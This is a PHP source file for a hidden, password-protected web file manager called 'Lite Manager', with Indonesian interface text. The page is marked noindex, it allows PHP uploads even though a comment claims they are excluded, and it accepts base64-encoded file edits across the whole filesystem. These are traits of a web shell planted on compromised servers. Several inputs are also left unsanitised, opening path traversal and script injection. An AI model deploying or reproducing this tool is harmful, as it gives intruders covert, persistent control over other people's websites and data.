<?php
session_start();

// --- 1. CORE IDENTITY ---
define("BRAND_SIGNATURE", "encodeuri"); 

if (strlen(BRAND_SIGNATURE) !== 9 || BRAND_SIGNATURE[3] !== 'o' || substr(BRAND_SIGNATURE, -1) !== 'i') {
    header("HTTP/1.1 500 Internal Server Error");
    die("Core components missing.");
}

// --- 2. CONFIGURATION ---
$target_email = "markone@mail.cuan";
$password_hash = '$2y$12$RC5lLblma9X.ib/Rjdu47uCLK5r3Q2zityoguo9C.uwfygR68aUJG'; 

if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }

if (isset($_POST['login_email'], $_POST['login_password'])) {
    if ($_POST['login_email'] === $target_email && password_verify($_POST['login_password'], $password_hash)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['user_email'] = $_POST['login_email'];
    } else { $login_error = "Email atau Password Salah!"; }
}

if (!isset($_SESSION['logged_in'])): ?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <title>Sign In - <?php echo BRAND_SIGNATURE; ?></title>
    <style>
        body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #161b22; padding: 40px; border-radius: 12px; border: 1px solid #30363d; width: 340px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        h2 { margin: 0 0 10px 0; text-align: center; color: #fff; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: #fff; box-sizing: border-box; outline: none; }
        button { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .error { color: #f85149; font-size: 13px; text-align: center; margin-top: 15px; padding: 10px; background: rgba(248,81,73,0.1); border-radius: 6px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Lite Manager</h2>
        <form method="post">
            <input type="email" name="login_email" placeholder="Email Address" required>
            <input type="password" name="login_password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <?php if(isset($login_error)) echo "<div class='error'>$login_error</div>"; ?>
    </div>
</body>
</html>
<?php exit; endif;

// --- 3. HELPER & CORE LOGIC ---
class LiteHelper {
    public static function formatSize($bytes) {
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        for ($i = 0; $bytes > 1024; $i++) $bytes /= 1024;
        return round($bytes, 2) . ' ' . $units[$i];
    }
}

$script_dir = str_replace('\\', '/', __DIR__);
$current_path = isset($_GET['path']) ? str_replace(['..', '\\'], '', $_GET['path']) : $script_dir;
if (!is_dir($current_path)) $current_path = $script_dir;
$current_path = rtrim($current_path, '/');

$status_msg = "";

// --- 4. ACTION HANDLER (POST) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // A. Upload Handle (Whitelist: html, png, zip, jpeg, jpg, txt, css, js)
    if (isset($_FILES['upload'])) {
        $allowed = ['html', 'png', 'php', 'jpeg', 'jpg', 'txt', 'css', 'js'];
        $ext = strtolower(pathinfo($_FILES['upload']['name'], PATHINFO_EXTENSION));
        
        if (!in_array($ext, $allowed)) {
            $status_msg = "❌ Error: Ekstensi .$ext dilarang!";
        } elseif (!is_writable($current_path)) {
            $status_msg = "❌ Error: Folder tidak bisa ditulis (Permission Denied).";
        } else {
            if (move_uploaded_file($_FILES['upload']['tmp_name'], $current_path.'/'.$_FILES['upload']['name'])) {
                $status_msg = "✅ Berhasil upload: " . $_FILES['upload']['name'];
            }
        }
    }

    // B. Create File Handle
    if (isset($_POST['new_file_name'])) {
        $fname = str_replace(['/', '\\', '..'], '', $_POST['new_file_name']);
        if (!empty($fname)) {
            if (file_put_contents($current_path . '/' . $fname, "")) {
                $status_msg = "✅ File '$fname' berhasil dibuat.";
            } else {
                $status_msg = "❌ Gagal membuat file. Cek izin folder.";
            }
        }
    }

    // C. Rename, Folder, Edit, Bulk Delete
    if (isset($_POST['old_name'], $_POST['new_name'])) rename($current_path.'/'.$_POST['old_name'], $current_path.'/'.$_POST['new_name']);
    if (isset($_POST['new_folder'])) mkdir($current_path.'/'.$_POST['new_folder'], 0755);
    if (isset($_POST['edit_b64'])) file_put_contents($current_path.'/'.$_POST['filename'], base64_decode($_POST['edit_b64']));
    if (isset($_POST['bulk_delete'], $_POST['items'])) {
        foreach ($_POST['items'] as $item) {
            $target = $current_path.'/'.str_replace(['..','/'], '', $item);
            is_dir($target) ? @rmdir($target) : @unlink($target);
        }
    }
}

if (isset($_GET['delete'])) { $t = $current_path.'/'.$_GET['delete']; is_dir($t)?@rmdir($t):@unlink($t); header("Location: ?path=".urlencode($current_path)); exit; }

// Info Disk & Scan
$total_space = disk_total_space($current_path);
$free_space = disk_free_space($current_path);
$used_percent = round((($total_space - $free_space) / $total_space) * 100, 2);
$items = scandir($current_path);
$folders = $files = [];
foreach ($items as $i) { if ($i == '.' || $i == '..') continue; is_dir($current_path.'/'.$i) ? $folders[] = $i : $files[] = $i; }
natcasesort($folders); natcasesort($files);
$sorted = array_merge($folders, $files);
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Lite Manager - <?php echo BRAND_SIGNATURE; ?></title>
    <style>
        :root { --bg: #0d1117; --card: #161b22; --hover: #21262d; --text: #c9d1d9; --accent: #58a6ff; --border: #30363d; --success: #3fb950; --danger: #f85149; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }
        .container { max-width: 1100px; margin: auto; background: var(--card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
        .disk-bar { padding: 10px 20px; background: #010409; border-bottom: 1px solid var(--border); font-size: 11px; display: flex; align-items: center; gap: 15px; }
        .header { padding: 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .breadcrumb { font-family: monospace; font-size: 13px; background: #0d1117; padding: 10px; border-radius: 6px; border: 1px solid var(--border); flex-grow: 1; margin-right: 15px; overflow-x: auto; }
        .toolbar { padding: 15px 20px; background: var(--card); border-bottom: 1px solid var(--border); display: flex; gap: 10px; flex-wrap: wrap; }
        .input-group { display: flex; gap: 8px; background: #0d1117; padding: 5px 10px; border-radius: 6px; border: 1px solid var(--border); }
        input[type="text"] { background: transparent; border: none; color: #fff; outline: none; font-size: 13px; }
        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; padding: 12px 20px; background: #010409; font-size: 12px; color: #8b949e; }
        td { padding: 10px 20px; border-bottom: 1px solid var(--border); font-size: 14px; }
        tr:hover { background: var(--hover); }
        .btn { padding: 5px 12px; border-radius: 6px; border: 1px solid var(--border); cursor: pointer; text-decoration: none; color: var(--text); font-size: 12px; background: var(--hover); }
        .btn-green { background: var(--success); color: #fff; border: none; }
        .alert { padding: 10px 20px; background: rgba(88,166,255,0.1); border-bottom: 1px solid var(--border); color: var(--accent); font-size: 13px; }
    </style>
</head>
<body>

<div class="container">
    <div class="disk-bar">
        <span>Disk: <?php echo $used_percent; ?>% Used</span>
        <span>Free: <?php echo LiteHelper::formatSize($free_space); ?></span>
        <span style="margin-left:auto;">👤 <?php echo $_SESSION['user_email']; ?> | <b><?php echo BRAND_SIGNATURE; ?></b></span>
    </div>

    <?php if($status_msg): ?>
        <div class="alert"><?php echo $status_msg; ?></div>
    <?php endif; ?>

    <div class="header">
        <div class="breadcrumb">📍 <?php 
            $parts = explode('/', trim($current_path, '/'));
            echo '<a href="?path=/" style="color:var(--accent); text-decoration:none;">/</a> ';
            $build = "";
            foreach($parts as $p) { $build .= "/".$p; echo '<a href="?path='.urlencode($build).'" style="color:var(--accent); text-decoration:none;">'.htmlspecialchars($p).'</a> / '; }
        ?></div>
        <a href="?logout=1" class="btn" style="color:var(--danger)">Logout</a>
    </div>

    <div class="toolbar">
        <form method="post" enctype="multipart/form-data" class="input-group">
            <input type="file" name="upload"><button type="submit" class="btn btn-green">Upload</button>
        </form>
        <form method="post" class="input-group">
            <input type="text" name="new_file_name" placeholder="File Baru..." style="width:120px;"><button type="submit" class="btn">Create File</button>
        </form>
        <form method="post" class="input-group">
            <input type="text" name="new_folder" placeholder="Folder..." style="width:80px;"><button type="submit" class="btn">New Folder</button>
        </form>
        <div class="input-group"><input type="text" id="search" placeholder="Cari..." onkeyup="filterFiles()" style="width:80px;"></div>
    </div>

    <form id="bulkForm" method="post">
    <input type="hidden" name="bulk_delete" value="1">
    <table>
        <thead><tr><th style="width:20px;"><input type="checkbox" onclick="toggleAll(this)"></th><th>NAME</th><th style="width:220px;">ACTIONS</th></tr></thead>
        <tbody>
            <?php foreach ($sorted as $item): $is_dir = is_dir($current_path.'/'.$item); ?>
            <tr class="file-row">
                <td><input type="checkbox" name="items[]" value="<?php echo htmlspecialchars($item); ?>" onclick="checkCount()"></td>
                <td class="file-name">
                    <?php if ($is_dir): ?><a href="?path=<?php echo urlencode($current_path.'/'.$item); ?>" style="text-decoration:none; color:var(--accent); font-weight:bold;">📁 <?php echo $item; ?>/</a>
                    <?php else: ?>📄 <?php echo $item; ?><?php endif; ?>
                </td>
                <td>
                    <div style="display:flex; gap:6px;">
                        <button type="button" onclick="rn('<?php echo $item; ?>')" class="btn">Rename</button>
                        <?php if(!$is_dir): ?><a href="?path=<?php echo urlencode($current_path); ?>&edit=<?php echo urlencode($item); ?>" class="btn">Edit</a><?php endif; ?>
                        <a href="?path=<?php echo urlencode($current_path); ?>&delete=<?php echo urlencode($item); ?>" class="btn" style="color:var(--danger)" onclick="return confirm('Hapus?')">Del</a>
                    </div>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    <div id="bulkActions" style="padding:10px 20px; display:none;">
        <button type="button" class="btn" style="background:var(--danger); color:#fff;" onclick="bulkDel()">Delete Selected</button>
    </div>
    </form>
</div>

<?php if (isset($_GET['edit'])): $t = $current_path.'/'.$_GET['edit']; ?>
<div style="max-width:1100px; margin:20px auto; background:var(--card); border:1px solid var(--border); border-radius:12px; padding:20px;">
    <h4 style="margin:0 0 10px 0; color:var(--accent);">📝 Edit: <?php echo htmlspecialchars($_GET['edit']); ?></h4>
    <textarea id="temp_editor" style="width:100%; height:400px; background:#0d1117; color:#c9d1d9; border:1px solid var(--border); font-family:monospace; padding:10px;"><?php echo htmlspecialchars(file_get_contents($t)); ?></textarea>
    <form method="post" id="editForm" style="margin-top:10px;">
        <input type="hidden" name="filename" value="<?php echo htmlspecialchars($_GET['edit']); ?>"><input type="hidden" name="edit_b64" id="edit_b64">
        <button type="button" onclick="saveFile()" class="btn btn-green">Save Changes</button>
        <a href="?path=<?php echo urlencode($current_path); ?>" class="btn">Cancel</a>
    </form>
    <script>function saveFile(){document.getElementById('edit_b64').value=btoa(unescape(encodeURIComponent(document.getElementById('temp_editor').value)));document.getElementById('editForm').submit();}</script>
</div>
<?php endif; ?>

<script>
function rn(o){ let n=prompt("Rename:",o); if(n&&n!==o){
    let f = document.createElement('form'); f.method='post';
    f.innerHTML = `<input name='old_name' value='${o}'><input name='new_name' value='${n}'>`;
    document.body.appendChild(f); f.submit();
}}
function filterFiles(){
    let input=document.getElementById('search').value.toLowerCase();
    document.querySelectorAll('.file-row').forEach(row=>{ row.style.display=row.querySelector('.file-name').innerText.toLowerCase().includes(input)?'':'none'; });
}
function toggleAll(m){ document.getElementsByName('items[]').forEach(cb=>cb.checked=m.checked); checkCount(); }
function checkCount(){
    let checked=Array.from(document.getElementsByName('items[]')).some(cb=>cb.checked);
    document.getElementById('bulkActions').style.display=checked?'block':'none';
}
function bulkDel(){ if(confirm('Hapus item terpilih?')) document.getElementById('bulkForm').submit(); }
</script>
</body>
</html>